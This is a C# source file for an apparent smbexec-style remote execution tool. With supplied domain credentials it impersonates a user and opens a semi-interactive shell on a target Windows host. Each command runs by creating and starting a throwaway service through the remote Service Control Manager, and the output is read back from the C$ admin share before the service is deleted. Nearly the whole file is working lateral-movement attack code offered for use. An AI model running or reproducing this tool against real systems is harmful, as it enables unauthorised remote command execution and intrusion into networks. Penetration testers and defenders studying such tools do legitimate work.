using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;


namespace SMBe2
{

 
        class Program
        {
            // --- Win32 API Imports ---
            [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", CharSet = CharSet.Unicode, SetLastError = true)]
            public static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool StartService(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool DeleteService(IntPtr hService);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool CloseServiceHandle(IntPtr hSCObject);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool RevertToSelf();

            const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
            const uint SERVICE_ALL_ACCESS = 0xF01FF;
            const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
            const uint SERVICE_DEMAND_START = 0x00000003;
            const uint SERVICE_ERROR_IGNORE = 0x00000000;

            static void Main(string[] args)
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Usage: smbexec.exe <target> <domain\\user> <password>");
                    return;
                }

                string target = args[0];
                string fullUser = args[1];
                string pass = args[2];
                string domain = ".";
                string user = fullUser;

                if (fullUser.Contains("\\"))
                {
                    domain = fullUser.Split('\\')[0];
                    user = fullUser.Split('\\')[1];
                }

                // Impersonate to gain network access to the target's SCM and Filesystem
                if (LogonUser(user, domain, pass, 9, 0, out IntPtr token))
                {
                    if (ImpersonateLoggedOnUser(token))
                    {
                        RunInteractiveShell(target);
                        RevertToSelf();
                    }
                }
                else
                {
                    Console.WriteLine($"[-] Authentication failed: {Marshal.GetLastWin32Error()}");
                }
            }

            static void RunInteractiveShell(string target)
            {
                string outputFileName = "__output_" + Guid.NewGuid().ToString().Substring(0, 8);
                string remotePath = $@"\\{target}\C$\Windows\Temp\{outputFileName}";
                string commandBase = $@"cmd.exe /Q /c ";

                Console.WriteLine($"[!] Semi-interactive shell opened on {target}");
                Console.WriteLine("[!] Type 'exit' to quit.\n");
                Console.WriteLine(outputFileName);
                while (true)
                {
                    Console.Write("C:\\Windows\\System32> ");
                    string input = Console.ReadLine();

                    if (string.IsNullOrEmpty(input)) continue;
                    if (input.ToLower() == "exit") break;

                // Build payload: Execute command -> redirect to file -> delete file after reading
                //string payload = $"{commandBase} {input} > C:\\Windows\\Temp\\{outputFileName} 2>&1";
                //string payload = "%COMSPEC% /Q /c echo " + input + " ^> C:\\Windows\\Temp\\" + outputFileName + " 2^>^&1 > _batch.bat & _batch.bat & del _batch.bat";
                // Wrap the command in \" to ensure the SCM parses the arguments correctly
                string payload = "cmd.exe /c \" " + input + " > C:\\Windows\\Temp\\" + outputFileName + " 2>&1 \"";
                ExecuteCommandViaService(target, payload);

                    // Wait a moment for the file to be written and closed
                    Thread.Sleep(500);

                    // Read and Print Output
                    try
                    {
                        if (File.Exists(remotePath))
                        {
                            string output = File.ReadAllText(remotePath);
                            Console.WriteLine(output);
                            //File.Delete(remotePath); // Clean up for next command
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Could not retrieve output: {e.Message}");
                    }
                }
            }

        //static void ExecuteCommandViaService(string target, string payload)
        //{
        //    string svcName = "Svc" + Guid.NewGuid().ToString().Substring(0, 8);
        //    IntPtr scm = OpenSCManager(target, null, SC_MANAGER_ALL_ACCESS);

        //    if (scm != IntPtr.Zero)
        //    {
        //        IntPtr svc = CreateService(scm, svcName, svcName, SERVICE_ALL_ACCESS,
        //            SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        //            payload, null, IntPtr.Zero, null, null, null);

        //        if (svc != IntPtr.Zero)
        //        {
        //            StartService(svc, 0, null); // This will time out/return false, which is fine
        //            DeleteService(svc);
        //            CloseServiceHandle(svc);
        //        }
        //        CloseServiceHandle(scm);
        //    }
        //}
        static void ExecuteCommandViaService(string target, string payload)
        {
            string svcName = "Svc" + Guid.NewGuid().ToString().Substring(0, 8);
            IntPtr scm = OpenSCManager(target, null, SC_MANAGER_ALL_ACCESS);

            if (scm == IntPtr.Zero)
            {
                Console.WriteLine("[-] SCM Access Denied. Check Admin rights.");
                return;
            }

            // Wrap the payload in quotes for the Service Control Manager
            string formattedPayload = $"cmd.exe /c \"{payload}\"";

            IntPtr svc = CreateService(
                scm,
                svcName,
                svcName,
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                formattedPayload, // Use the formatted string
                null, IntPtr.Zero, null, null, null);

            if (svc != IntPtr.Zero)
            {
                // StartService will return false, but the command will run
                StartService(svc, 0, null);

                // Give the process a moment to execute before deleting the service
                Thread.Sleep(1000);

                DeleteService(svc);
                CloseServiceHandle(svc);
            }
            else
            {
                Console.WriteLine($"[-] CreateService Failed: {Marshal.GetLastWin32Error()}");
            }
            CloseServiceHandle(scm);
        }
    }
    }